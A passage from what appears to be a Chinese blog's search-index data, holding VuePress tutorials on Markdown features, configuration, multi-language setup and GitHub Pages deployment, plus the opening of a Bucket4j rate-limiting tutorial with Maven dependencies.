Markdown 文件中导入已经存在的其他文件中的代码段： 1&lt;&lt;&lt; @/filepath 它也支持 行高亮，语法如下： 1&lt;&lt;&lt; @/filepath{highlightLines} 输入内容 1&lt;&lt;&lt; @/../@vuepress/markdown/__tests__/fragments/snippet.js{2} 输出效果 Tip 注意：由于代码段的导入将在 Webpack 编译之前执行，因此你无法使用 Webpack 中的路径别名，此处的 @ 默认值是 process.cwd() 为了只导入对应部分的代码，你也可运用 VS Code Region。你可以在文件路径后方的 # 紧接着提供一个自定义的区域名称（预设为 snippet ） 代码文件 1234567891011121314151617181920212223242526272829303132// #region snippetfunction foo () { return ({ dest: '../../vuepress', locales: { '/': { lang: 'en-US', title: 'VuePress', description: 'Vue-powered Static Site Generator' }, '/zh/': { lang: 'zh-CN', title: 'VuePress', description: 'Vue 驱动的静态网站生成器' } }, head: [ ['link', { rel: 'icon', href: `/logo.png` }], ['link', { rel: 'manifest', href: '/manifest.json' }], ['meta', { name: 'theme-color', content: '#3eaf7c' }], ['meta', { name: 'apple-mobile-web-app-capable', content: 'yes' }], ['meta', { name: 'apple-mobile-web-app-status-bar-style', content: 'black' }], ['link', { rel: 'apple-touch-icon', href: `/icons/apple-touch-icon-152x152.png` }], ['link', { rel: 'mask-icon', href: '/icons/safari-pinned-tab.svg', color: '#3eaf7c' }], ['meta', { name: 'msapplication-TileImage', content: '/icons/msapplication-icon-144x144.png' }], ['meta', { name: 'msapplication-TileColor', content: '#000000' }] ] })}// #endregion snippetexport default foo 输入内容 1&lt;&lt;&lt; @/../@vuepress/markdown/__tests__/fragments/snippet-with-region.js#snippet{1} 输出效果 进阶配置VuePress 使用 markdown-it 来渲染 Markdown，上述大多数的拓展也都是通过自定义的插件实现的。想要进一步的话，你可以通过 .vuepress/config.js 的 markdown 选项，来对当前的 markdown-it 实例做一些自定义的配置： 123456789101112module.exports = { markdown: { // markdown-it-anchor 的选项 anchor: { permalink: false }, // markdown-it-toc 的选项 toc: { includeLevel: [1, 2] }, extendMarkdown: md =&gt; { &nbsp; &nbsp; &nbsp;// 使用更多的 markdown-it 插件! md.use(require('markdown-it-xxx')) } }} 在 Markdown 中 使用 Vue浏览器的 API 访问限制当你在开发一个 VuePress 应用时，由于所有的页面在生成静态 HTML 时都需要通过 Node.js 服务端渲染，因此所有的 Vue 相关代码都应当遵循 编写通用代码 的要求。简而言之，请确保只在 beforeMount 或者 mounted 访问浏览器 DOM 的 API。 如果你正在使用，或者需要展示一个对于 SSR 不怎么友好的组件（比如包含了自定义指令），你可以将它们包裹在内置的 &lt;ClientOnly&gt; 组件中： 123&lt;ClientOnly&gt; &lt;NonSSRFriendlyComponent/&gt;&lt;/ClientOnly&gt; 请注意，这并不能解决一些组件或库在导入时就试图访问浏览器 API 的问题 —— 如果需要使用这样的组件或库，你需要在合适的生命周期钩子中动态导入它们： 123456789&lt;script&gt;export default { mounted () { import('./lib-that-access-window-on-import').then(module =&gt; { // use code }) }}&lt;/script&gt; 如果你的模块通过 export default 导出一个 Vue 组件，那么你可以动态注册它： 1234567891011121314151617&lt;template&gt; &lt;component v-if=\"dynamicComponent\" :is=\"dynamicComponent\"&gt;&lt;/component&gt;&lt;/template&gt;&lt;script&gt;export default { data() { return { dynamicComponent: null } }, mounted () { import('./lib-that-access-window-on-import').then(module =&gt; { this.dynamicComponent = module.default }) }}&lt;/script&gt; 参考： Vue.js &gt; 动态组件 模板语法插值每一个 Markdown 文件将首先被编译成 HTML，接着作为一个 Vue 组件传入 vue-loader，这意味着你可以在文本中使用 Vue 风格的插值： 输入内容 1{{ 1 + 1 }} 输出效果 12 指令同样地，也可以使用指令: 输入内容 1&lt;span v-for=\"i in 3\"&gt;{{ i }} &lt;/span&gt; 输出效果 11 2 3 访问网站以及页面的数据编译后的组件没有私有数据，但可以访问 网站的元数据，举例来说： 输入内容 1{{ $page }} 输出效果 12345{ \"path\": \"/using-vue.html\", \"title\": \"Using Vue in Markdown\", \"frontmatter\": {}} Escaping默认情况下，块级 (block) 的代码块将会被自动包裹在 v-pre 中。如果你想要在内联 (inline) 的代码块或者普通文本中显示原始的大括号，或者一些 Vue 特定的语法，你需要使用自定义容器 v-pre 来包裹： 输入内容 123::: v-pre`{{ This will be displayed as-is }}`::: 输出效果 1{{ This will be displayed as-is }} 使用组件正常使用组件所有在 .vuepress/components 中找到的 *.vue 文件将会自动地被注册为全局的异步组件，如： 1234567.└─ .vuepress &nbsp;&nbsp;└─ components ├─ demo-1.vue &nbsp;&nbsp; &nbsp;├─ OtherComponent.vue &nbsp; &nbsp; &nbsp;└─ Foo &nbsp; &nbsp; &nbsp; &nbsp; └─ Bar.vue 你可以直接使用这些组件在任意的 Markdown 文件中（组件名是通过文件名取到的）： 123&lt;demo-1/&gt;&lt;OtherComponent/&gt;&lt;Foo-Bar/&gt; Warning 重要：请确保一个自定义组件的名字包含连接符或者是 PascalCase，否则，它将会被视为一个内联元素，并被包裹在一个 &lt;p&gt; 标签中，这将会导致 HTML 渲染紊乱，因为 HTML 标准规定， &lt;p&gt; 标签中不允许放置任何块级元素。 在标题中使用组件你可以在标题中使用 Vue 组件，但是请留意以下两种方式的不同： Markdown 输出的 HTML 解析后的标题 # text &lt;Tag/&gt; &lt;h1&gt;text &lt;Tag/&gt;&lt;/h1&gt; text # text `&lt;Tag/&gt;` &lt;h1&gt;text &lt;code&gt;&amp;lt;Tag/&amp;gt;&lt;/code&gt;&lt;/h1&gt; text &lt;Tag/&gt; 被 &lt;code&gt; 包装的 HTML 将按原样显示，只有未被包装的 HTML 才会被 Vue 解析。输出的 HTML 由 markdown-it 完成，而解析后的标题由 VuePress 完成，用于侧边栏以及文档的标题。 使用预处理器VuePress 对以下预处理器已经内置相关的 Webpack 配置：sass、scss、less、stylus 和 pug。要使用它们你只需要在项目中安装对应的依赖即可。例如，要使用 sass，需要安装： 1$ yarn add -D sass-loader node-sass 然后你就可以在 Markdown 或是组件中使用如下代码： 1234&lt;style lang=\"sass\"&gt; .title font-size: 20px&lt;/style&gt; 要在组件中使用 &lt;template lang=\"pug\"&gt;，则需要安装 pug 和 pug-plain-loader: 1$ yarn add -D pug pug-plain-loader 需要指出的是，如果你是一个 stylus 用户，你并不需要在你的项目中安装 stylus 和 stylus-loader，因为 VuePress 已经内置了它们。对于那些没有内置的预处理器，除了安装对应的依赖，你还需要 拓展内部的 Webpack 配置。 脚本和样式提升有时，你可以只想在当前页面应用一些 JavaScript 或者 CSS，在这种情况下，你可以直接在 Markdown 文件中使用原生的 &lt;script&gt; 或者 &lt;style&gt; 标签，它们将会从编译后的 HTML 文件中提取出来，并作为生成的 Vue 单文件组件的 &lt;script&gt; 和 &lt;style&gt; 标签。 输入内容 1234567891011121314151617&lt;p class=\"demo\" :class=\"$style.example\"&gt;&lt;/p&gt;&lt;style module&gt;.example { color: #41b883;}&lt;/style&gt;&lt;script&gt;export default { props: ['slot-key'], mounted () { document.querySelector(`.${this.$style.example}`) .textContent = '这个块是被内联的脚本渲染的，样式也采用了内联样式。' }}&lt;/script&gt; 输出效果 内置的组件OutboundLinkOutboundLink 用来表明当前是一个外部链接，在 VuePress 中这个组件会紧跟在每一个外部链接后面。 ClientOnly参考 浏览器的 API 访问限制。 Content Props: pageKey - string, 要渲染的 page 的 hash key, 默认值是当前页面的 key. slotKey - string, 页面的 markdown slot 的 key. 默认值是 default slot. Usage： 指定一个指定页面的特定 slot 用于渲染，当你使用 自定义布局 或者自定义主题时，这将非常有用。 1&lt;Content/&gt; 参考: 全局计算属性 &gt; $page Markdown 插槽 开发主题 &gt; 获取渲染内容 Badge 注意： Badge 只针对 VuePress 的默认主题生效 Props: text - string type - string, 可选值： \"tip\"|\"warning\"|\"error\"，默认值是： \"tip\" vertical - string, 可选值： \"top\"|\"middle\"，默认值是： \"top\" Usage: 你可以在标题中，使用这个组件来为某些 API 添加一些状态。 输入内容 1### Badge &lt;Badge text=\"beta\" type=\"warning\"/&gt; &lt;Badge text=\"默认主题\"/&gt; 输入效果 参考: 在标题中使用组件 下篇 - VuePress 入门教程之三 VuePress 入门教程之三主题篇 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ \"id\": \"readmore-container\", \"blogId\": \"96641-5333172926158-056\", \"name\": \"全栈技术驿站\", \"qrcode\": \"https://www.techgrow.cn/img/wx_mp_qr.png\", \"keyword\": \"Tech\", \"lockToc\": \"yes\", \"random\": \"0.9\" }); } catch(e) { console.warn(e.name + \" : \" + e.message); } }",tags:"静态博客"},{title:"VuePress 入门教程之一快速入门篇",url:"/posts/8d13e75d.html",text:"前言VuePress 站点 VuePress 官方文档 VuePress 中文文档 VuePress Github 项目 静态网站生成器比较Hexo Hexo 是一个快速、简洁且高效的博客框架。Hexo 使用 Markdown（或其它渲染引擎）解析文章，在几秒内，即可利用靓丽的主题生成静态网页。Hexo 配合它的主题模块，比如 NexT 主题，可以作为非常简洁方便的静态博客系统。 GitBook GitBook 是一个现代的文档平台，团队或个人可以在其上编写产品、API 接口文档以及团队内部知识库。GitBook 改版之后，感觉团队更专注于商业产品而不是开源工具，同时 CLI 工具不再提供了，所以无法实现个性化部署。 Nuxt Nuxt.js 是一个基于 Vue.js 的通用应用框架。通过对客户端 / 服务端基础架构的抽象组织，Nuxt.js 主要关注的是应用的 UI 渲染。Nuxt.js 的目标是创建一个灵活的应用框架，你可以基于它初始化新项目的基础结构代码，或者在已有 Node.js 项目中使用 Nuxt.js。简而言之，Nuxt.js 更像是为构建应用程序而生的，而不是独立的内容静态网站。 Docsify Docsify 是一个动态生成文档网站的工具。不同于 GitBook、Hexo 的地方是它不会生成将 .md 转成 .html 文件，所有转换工作都是在运行时进。Docsify 是基于 Vue，完全的运行时驱动，不需要渲染 HTML，所以对 SEO 不够友好。如果不关注 SEO，安装简单化不想有大量依赖，它是比较好的选择，比如公司或这团队内部的文档系统。 Docute Docute 本质上就是一个 JavaScript 文件，它可以获取 Markdown 文件并将它们呈现为单页面应用。它完全由运行时驱动，因此并不涉及服务端组件，这就意味着没有构建过程。你只需创建一个 HTML 文件和一堆 Markdown 文档，你的网站就差不多完成了！Docute 与 Docsify 基本一样，只是在文件大小和 UI 及不同的使用方式，Docute 官网有其差异的介绍。 VuePress VuePress 实际上是由 Vue、Vue Router 和 Webpack 驱动的单页面应用程序，实现了 GitBook 的功能。VuePress 展示页面与 Docsify 类似，但是与 Docsify 不同的是会预先渲染 HTML。每个 Markdown 文件都使用 markdown-it 编译为 HTML，然后作为 Vue 组件的模板进行处理；这允许你直接在 Markdown 文件中使用 Vue，在需要嵌入动态内容时，这种使用方式非常有用。 Other Jekyll、Typecho、Hugo、Ghost VuePress 介绍VuePress 由两部分组成：第一部分是一个极简静态网站生成器，它包含由 Vue 驱动的主题系统和插件 API，另一个部分是为书写技术文档而优化的默认主题，它的诞生初衷是为了支持 Vue 及其子项目的文档需求。每一个由 VuePress 生成的页面都带有预渲染好的 HTML，也因此具有非常好的加载性能和搜索引擎优化（SEO）。同时，一旦页面被加载，Vue 将接管这些静态内容，并将其转换成一个完整的单页应用（SPA），其他的页面则会只在用户浏览到的时候才按需加载。 工作原理事实上，一个 VuePress 网站是一个由 Vue、Vue Router 和 Webpack 驱动的单页应用。如果你以前使用过 Vue 的话，当你在开发一个自定义主题的时候，你会感受到非常熟悉的开发体验，你甚至可以使用 Vue DevTools 去调试你的自定义主题。在构建时，我们会为应用创建一个服务端渲染（SSR）的版本，然后通过虚拟访问每一条路径来渲染对应的 HTML。这种做法的灵感来源于 Nuxt 的 nuxt generate 命令，以及其他的一些项目，比如 Gatsby。 功能说明内置的 Markdown 拓展 目录 自定义容器 代码块中的行高亮 行号 导入代码段 在 Markdown 中 使用 Vue 模板语法 使用组件 Vue 驱动的自定义主题系统 网站和页面的元数据 内容摘抄 默认主题 Responsive layout 首页 内置的搜索 Algolia 搜索 可定制的 navbar and sidebar 自动生成的 GitHub 链接和页面编辑链接 PWA: 刷新内容的 Popup 最后更新时间 多语言支持 博客主题 文档 在线案例 Plugin 强大的 Plugin API 博客插件 PWA 插件 Google Analytics 插件 … VuePress 快速入门 Warning 前提条件：VuePress 需要 Node.js &gt;= 8.6 下述内容会帮助你从头搭建一个简单的 VuePress 文档，如果你想在一个现有的项目中使用 VuePress 来管理文档，从步骤 3 开始。 创建并进入一个新目录 1$ mkdir vuepress-starter &amp;&amp; cd vuepress-starter 使用你喜欢的包管理器进行初始化 1234$ yarn init# 或者$ npm init 将 VuePress 安装为本地依赖 1234$ yarn add -D vuepress# 或者$ npm install -D vuepress # npm install vuepress --save-dev Warning 注意：官方已经不再推荐全局安装 VuePress，如果你的现有项目依赖了 Webpack 3.x，则推荐使用 Yarn 而不是 NPM 来安装 VuePress。因为在这种情形下，NPM 会生成错误的依赖树 创建第一篇文档 1$ mkdir docs &amp;&amp; echo '# Hello VuePress' &gt; docs/README.md 在 package.json 中添加一些 scripts 这一步骤是可选的，但推荐你完成它。在下文中，会默认这些 scripts 已经被添加。 123456{ \"scripts\": { \"docs:dev\": \"vuepress dev docs\", \"docs:build\": \"vuepress build docs\" }} 在本地启动服务器 1234$ yarn docs:dev# 或者$ npm run docs:dev VuePress 会在 http://127.0.0.1:8080 启动一个热重载的开发服务器，此时你就拥有了一个简单可用的 VuePress 文档。当你的文档逐渐成型的时候，不要忘记 VuePress 的 多语言支持 ，并了解一下如何将你的文档 部署 到任意静态文件服务器上。 目录结构说明 如果 docs 目录做为顶级目录（非 vuepress-starter 的子目录），如下所示： 123456.├─ docs│ ├─ README.md│ └─ .vuepress│ └─ config.js└─ package.json 那么 package.json 的配置内容需要更改为： 123456{ \"scripts\": { \"build\": \"vuepress build .\", \"dev\": \"vuepress dev .\" }} Shell 脚本的内容则更改为： 1234$ yarn dev# 或者$ npm run dev VuePress 基础概念目录结构VuePress 遵循 “约定优于配置” 的原则，推荐的目录结构如下： 12345678910111213141516171819202122.├── docs│&nbsp;&nbsp; ├── .vuepress _(**可选的**)_│&nbsp;&nbsp; │&nbsp;&nbsp; ├── `components` _(**可选的**)_│&nbsp;&nbsp; │&nbsp;&nbsp; ├── `theme` _(**可选的**)_│&nbsp;&nbsp; │&nbsp;&nbsp; │ └── Layout.vue│&nbsp;&nbsp; │&nbsp;&nbsp; ├── `public` _(**可选的**)_│&nbsp;&nbsp; │&nbsp;&nbsp; ├── `styles` _(**可选的**)_│&nbsp;&nbsp; │&nbsp;&nbsp; │&nbsp;&nbsp; ├── index.styl│&nbsp;&nbsp; │&nbsp;&nbsp; │&nbsp;&nbsp; └── palette.styl│&nbsp;&nbsp; │&nbsp;&nbsp; ├── `templates` _(**可选的, 谨慎配置**)_│&nbsp;&nbsp; │&nbsp;&nbsp; │ &nbsp; ├── dev.html│&nbsp;&nbsp; │&nbsp;&nbsp; │ &nbsp; └── ssr.html│&nbsp;&nbsp; │&nbsp;&nbsp; ├── `config.js` _(**可选的**)_│&nbsp;&nbsp; │&nbsp;&nbsp; └── `enhanceApp.js` _(**可选的**)_│&nbsp;&nbsp; │&nbsp;│&nbsp;&nbsp; ├── README.md│&nbsp;&nbsp; ├── guide│&nbsp;&nbsp; │&nbsp;&nbsp; └── README.md│&nbsp;&nbsp; └── config.md│&nbsp;└── package.json Warning 注意：请留意目录名的大写 docs/.vuepress: 用于存放全局的配置、组件、静态资源等。 docs/.vuepress/components: 该目录中的 Vue 组件将会被自动注册为全局组件。 docs/.vuepress/theme: 用于存放本地主题。 docs/.vuepress/styles: 用于存放样式相关的文件。 docs/.vuepress/styles/index.styl: 将会被自动应用的全局样式文件，会生成在最终的 CSS 文件结尾，具有比默认样式更高的优先级。 docs/.vuepress/styles/palette.styl: 用于重写默认颜色常量，或者设置新的 stylus 颜色常量。 docs/.vuepress/public: 静态资源目录。 docs/.vuepress/templates: 存储 HTML 模板文件。 docs/.vuepress/templates/dev.html: 用于开发环境的 HTML 模板文件。 docs/.vuepress/templates/ssr.html: 构建时基于 Vue SSR 的 HTML 模板文件。 docs/.vuepress/config.js: 配置文件的入口文件，也可以是 YML 或 toml。 docs/.vuepress/enhanceApp.js: 客户端应用的增强。 Warning 注意：当你想要去自定义 templates/ssr.html 或 templates/dev.html 时，最好基于 默认的模板文件 来修改，否则可能会导致构建出错 页面路由此处一般把 docs 目录作为 targetDir （参考 命令行接口），下面所有的 “文件的相对路径” 都是相对于 docs 目录的。在项目根目录下的 package.json 中添加如下 scripts ： 123456{ \"scripts\": { \"dev\": \"vuepress dev docs\", \"build\": \"vuepress build docs\" }} 对于上述的目录结构，Vuepress 的默认页面路由地址如下： 文件的相对路径 页面路由地址 /README.md / /guide/README.md /guide/ /config.md /config.html 基本配置配置文件如果没有任何配置，这个网站将会是非常局限的，用户也无法在你的网站上自由导航。为了更好地自定义你的网站，首先需要在你的文档目录下创建一个 .vuepress 目录，所有 VuePress 相关的文件都将会被放在这里，项目结构示例如下： 123456.├─ docs│ ├─ README.md│ └─ .vuepress│ └─ config.js└─ package.json 一个 VuePress 网站最必要的配置文件是 .vuepress/config.js，它应该导出一个 JavaScript 对象： 1234module.exports = { title: 'Hello VuePress', description: 'Just playing around'} 对于上述的配置，如果你运行起 dev server，你应该能看到一个页面，它包含一个页头，里面包含一个标题和一个搜索框。VuePress 内置了基于 headers 的搜索 —— 它会自动为所有页面的标题、h2 和 h3 构建起一个简单的搜索索引。可参见 配置 来查看所有可配置的选项。 Tip 其他配置格式：你也可以使用 YAML (.vuepress/config.yml) 或是 TOML (.vuepress/config.toml) 格式的配置文件 主题配置一个 VuePress 主题应该负责整个网站的布局和交互细节。在 VuePress 中，目前自带了一个默认的主题（正是你现在所看到的），它是为技术文档而设计的。同时，默认主题提供了一些选项，让你可以去自定义导航栏（navbar）、 侧边栏（sidebar）和 首页（homepage） 等，详情请参见 默认主题配置 ，如果你想开发一个自定义主题，可以参考 自定义主题。 应用级别的配置由于 VuePress 是一个标准的 Vue 应用，你可以通过创建一个 .vuepress/enhanceApp.js 文件来做一些应用级别的配置，当该文件存在的时候，会被导入到应用内部。enhanceApp.js 应该 export default 一个钩子函数，并接受一个包含了一些应用级别属性的对象作为参数。你可以使用这个钩子来安装一些附加的 Vue 插件、注册全局组件，或者增加额外的路由钩子等： 12345678910// 使用异步函数也是可以的export default ({ Vue, // VuePress 正在使用的 Vue 构造函数 options, // 附加到根实例的一些选项 router, // 当前应用的路由实例 siteData, // 站点元数据 isServer // 当前应用配置是处于 服务端渲染 或 客户端}) =&gt; { // ...做一些其他的应用级别的优化} 静态资源相对路径所有的 Markdown 文件都会被 Webpack 编译成 Vue 组件，因此你可以，并且应该更倾向于使用相对路径（Relative URLs）来引用所有的静态资源： 1![An image](./image.png) 同样地，这在 *.vue 文件的模板中一样可以工作，图片将会被 url-loader 和 file-loader 处理，在运行生成静态文件的构建任务时，文件会被复制到正确的位置。 除此之外，你也使用 ~ 前缀来明确地指出这是一个 Webpack 的模块请求，这将允许你通过 Webpack 别名来引用文件或者 NPM 的依赖： 12![Image from alias](~@alias/image.png)![Image from dependency](~some-dependency/image.png) Webpack 的别名可以通过 .vuepress/config.js 中 configureWebpack 来配置，如： 123456789module.exports = { configureWebpack: { resolve: { alias: { '@alias': 'path/to/some/dir' } } }} 公共文件有时，你可能需要提供一个静态资源，但是它们并不直接被你的任何一个 Markdown 文件或者主题组件引用 —— 举例来说，favicons 和 PWA 的图标，在这种情形下，你可以将它们放在 .vuepress/public 中， 它们最终会被复制到生成的静态文件夹中。 基础路径如果你的网站会被部署到一个非根路径，你将需要在 .vuepress/config.js 中设置 base，举例来说，如果你打算将你的网站部署到 https://foo.github.io/bar/，那么 base 的值就应该被设置为 \"/bar/\" (应当总是以斜杠开始，并以斜杠结束)。有了基础路径（Base URL），如果你希望引用一张放在 .vuepress/public 中的图片，你需要使用这样路径：/bar/image.png，然而，一旦某一天你决定去修改 base，这样的路径引用将会显得异常脆弱。为了解决这个问题，VuePress 提供了内置的一个 helper $withBase（它被注入到了 Vue 的原型上），可以帮助你生成正确的路径： 1&lt;img :src=\"$withBase('/foo.png')\" alt=\"foo\"&gt; 值得一提的是，你不仅可以在你的 Vue 组件中使用上述的语法，在 Markdown 文件中亦是如此。最后补充一句，一个 base 路径一旦被设置，它将会自动地作为前缀插入到 .vuepress/config.js 中所有以 / 开始的资源路径中。 多语言支持站点多语言配置要启用 VuePress 的多语言支持，首先需要使用如下的文件结构： 12345678910docs├─ README.md├─ foo.md├─ nested│&nbsp;&nbsp;└─ README.md└─ zh ├─ README.md ├─ foo.md └─ nested &nbsp;&nbsp; └─ README.md 然后，在 .vuepress/config.js 中提供 locales 选项： 12345678910111213141516module.exports = { locales: { // 键名是该语言所属的子路径 // 作为特例，默认语言可以使用 '/' 作为其路径。 '/': { lang: 'en-US', // 将会被设置为 &lt;html&gt; 的 lang 属性 title: 'VuePress', description: 'Vue-powered Static Site Generator' }, '/zh/': { lang: 'zh-CN', title: 'VuePress', description: 'Vue 驱动的静态网站生成器' } }} 如果一个语言没有声明 title 或者 description，VuePress 将会尝试使用配置顶层的对应值。如果每个语言都声明了 title 和 description，则顶层的这两个值可以被省略。 默认主题多语言配置默认主题也内置了多语言支持，可以通过 themeConfig.locales 来配置。该选项接受同样的 { path: config } 格式的值。每个语言除了可以配置一些站点中用到的文字之外，还可以拥有自己的 导航栏 和 侧边栏 配置： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647module.exports = { locales: { '/': { lang: 'en-US', title: 'VuePress', description: 'Vue-powered Static Site Generator' }, '/zh/': { lang: 'zh-CN', title: 'VuePress', description: 'Vue 驱动的静态网站生成器' } }, themeConfig: { locales: { '/': { selectText: 'Languages', label: 'English', ariaLabel: 'Languages', editLinkText: 'Edit this page on GitHub', algolia: {}, nav: [ {text: 'Nested', link: '/nested/', ariaLabel: 'Nested'} ], sidebar: { '/nested/': [/* ... */] } }, '/zh/': { // 多语言下拉菜单的标题 selectText: '选择语言', // 该语言在下拉菜单中的标签 label: '简体中文', // 编辑链接文字 editLinkText: '在 GitHub 上编辑此页', // 当前 locale 的 algolia docsearch 选项 algolia: {}, nav: [ {text: '嵌套', link: '/zh/nested/'} ], sidebar: { '/zh/nested/': [/* ... */] } } } }} 编译构建 在 config.js 中指定构建的目标目录： 123module.exports = { dest: 'docs/.vuepress/dist'} 通过以下命令编译构建，生成 VuePress 网站所需的静态文件，这样就可以很方便地将 VuePress 文档部署到任意的 Web 服务器 123456789101112131415161718192021# 编译构建$ yarm docs:build# 或者$ npm run docs:build# 成功编译后，会在指定的目录下生成网站的所有静态文件，目录结构如下docs/.vuepress/dist├── 404.html├── assets├── contact├── debug├── en├── faq├── favicon.ico├── guide├── hero.png├── index.html├── logo.png├── manifest.json└── service-worker.js 目录结构说明 如果 docs 目录做为顶级目录，如下所示： 123456.├─ docs│ ├─ README.md│ └─ .vuepress│ └─ config.js└─ package.json 那么 config.js 的配置内容需要更改为： 123module.exports = { dest: '.vuepress/dist'} 编译构建的命令则更改为： 1234$ yarn build# 或者$ npm run build 部署方式GitHub Pages 在 docs/.vuepress/config.js 中设置正确的 base 如果你打算发布到 https://&lt;USERNAME&gt;.github.io/，则可以省略这一步，因为 base 默认即是 \"/\"。 如果你打算发布到 https://&lt;USERNAME&gt;.github.io/&lt;REPO&gt;/（也就是说你的仓库在 https://github.com/&lt;USERNAME&gt;/&lt;REPO&gt;），则将 base 设置为 \"/&lt;REPO&gt;/\"。 在你的项目中，创建一个如下的 deploy.sh 文件（请自行判断去掉对应的注释） 12345678910111213141516171819202122232425#!/usr/bin/env sh# 确保脚本抛出遇到的错误set -e# 生成静态文件npm run docs:build# 进入生成的文件夹cd docs/.vuepress/dist# 如果是发布到自定义域名# echo 'www.example.com' &gt; CNAMEgit initgit add -Agit commit -m 'deploy'# 如果发布到 https://&lt;USERNAME&gt;.github.io## git push -f git@github.com:&lt;USERNAME&gt;/&lt;USERNAME&gt;.github.io.git master# 如果发布到 https://&lt;USERNAME&gt;.github.io/&lt;REPO&gt;## git push -f git@github.com:&lt;USERNAME&gt;/&lt;REPO&gt;.git master:gh-pagescd - 你可以在你的持续集成的设置中，设置在每次 Push 代码时自动运行上述 Shell 脚本 GitHub Pages and Travis CI 在 docs/.vuepress/config.js 中设置正确的 base 如果你打算发布到 https://&lt;USERNAME or GROUP&gt;.github.io/，则可以省略这一步，因为 base 默认即是 \"/\"。 如果你打算发布到 https://&lt;USERNAME or GROUP&gt;.github.io/&lt;REPO&gt;/（也就是说你的仓库在 https://github.com/&lt;USERNAME&gt;/&lt;REPO&gt;），则将 base 设置为 \"/&lt;REPO&gt;/\"。 在项目的根目录创建一个名为 .travis.yml 的文件 在本地执行 yarn 或 npm install 并且提交生成的 lock 文件（即 yarn.lock 或 package-lock.json） 使用 GitHub Pages 部署提供程序模板，并遵循 Travis 文档规范 来编写 .travis.yml 文件 123456789101112131415language: node_jsnode_js: - lts/*install: - yarn install # npm ciscript: - yarn docs:build # npm run docs:builddeploy: provider: pages skip_cleanup: true local_dir: docs/.vuepress/dist github_token: $GITHUB_TOKEN # 在 GitHub 中生成，用于允许 Travis 向你的仓库推送代码。在 Travis 的项目设置页面进行配置，设置为 secure variable keep_history: true on: branch: master 下篇 - VuePress 入门教程之二 VuePress 入门教程之二 Markdown 篇 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ \"id\": \"readmore-container\", \"blogId\": \"96641-5333172926158-056\", \"name\": \"全栈技术驿站\", \"qrcode\": \"https://www.techgrow.cn/img/wx_mp_qr.png\", \"keyword\": \"Tech\", \"lockToc\": \"yes\", \"random\": \"0.9\" }); } catch(e) { console.warn(e.name + \" : \" + e.message); } }",tags:"静态博客"},{title:"Bucket4j 限流入门教程之一",url:"/posts/2885bf23.html",text:'前言限流概述在开发高并发系统时可以用三把利器来保护系统：缓存、降级和限流。缓存的目的是提升系统访问速度和增大系统处理的容量，是抗高并发流量的 “银弹”；而降级是当服务出现问题或者影响到核心流程时，需要暂时将其屏蔽掉，待高峰过去之后或者问题解决后再打开；而有些场景并不能用缓存和降级来解决，比如稀缺资源（秒杀、抢购）、写服务（如评论、下单）、频繁的复杂查询等，因此需要有一种手段来限制这些场景的并发 / 请求量，即限流。限流的目的是通过对并发访问 / 请求进行限速或者对一个时间窗口内的请求进行限速来保护系统，一旦达到限制速率则可以拒绝服务（定向到错误页或友好的展示页）、排队或等待（比如秒杀、评论、下单等场景）、降级（返回兜底数据或默认数据）。主流的中间件都会有单机限流框架，一般支持两种限流模式：控制速率和控制并发。Spring Cloud Zuul 通过第三方扩展 spring-cloud-zuul-ratelimit 也可以支持限流，而 Spring Cloud Gateway 的限流实现可以看这里。常见的限流算法有漏桶和令牌桶，计数器也可以进行粗暴限流实现。对于限流算法，可以参考 Guava 中的 RateLimiter、Bucket4j、RateLimitJ 等项目的具体实现。 Bucket4j 介绍Bucket4j 是基于令牌桶算法的 Java 限流库，它主要用在 3 种场景： 限制比较重工作的速率 限制对 API 的访问速率 将限流作为定时器，例如有些场景限制你对服务提供方的调用速度，因此使用限流器作为定时器，定时按照约定速率调用服务提供方 Spring Boot 整合 Bucket4j本案例主要是简单演示如何在单机 Spring Boot 应用中使用 Bucket4j，使用的缓存组件是 Caffeine（JCache API），点击下载完整的案例代码。特别注意，在企业开发中，若 Spring Boot 应用是以集群的方式部署，则必须采用分布式缓存方案，具体的参考方案如下： Back-end Documentation page Async supported Optimized serialization Thin-client support Hazelcast bucket4j-hazelcast Yes Yes Planned Apache Ignite bucket4j-ignite Yes n/a Yes Inifinispan bucket4j-infinspan Yes Yes No Oracle Coherence bucket4j-coherence Yes Yes No 代码示例添加 Bucket4j + Spring Boot Starter + Caffeine 相关的 Maven 依赖 123456789101112131415161718192021222324252627282930313233343536373839&lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;2.3.7.RELEASE&lt;/version&gt; &lt;relativePath/&gt;&lt;/parent&gt;&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.giffing.bucket4j.spring.boot.starter&lt;/groupId&gt; &lt;artifactId&gt;bucket4j-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;0.2.0&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-cache&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.github.ben-manes.caffeine&lt;/groupId&gt; &lt;artifactId&gt;caffeine&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.github.ben-manes.caffeine&lt;/groupId&gt; &lt;artifactId&gt;jcache&lt;/artifactId&gt; &lt;version&gt;2.5.3&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;javax.cache&lt;/groupId&gt; &lt;artifactId&gt;cache-api&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; 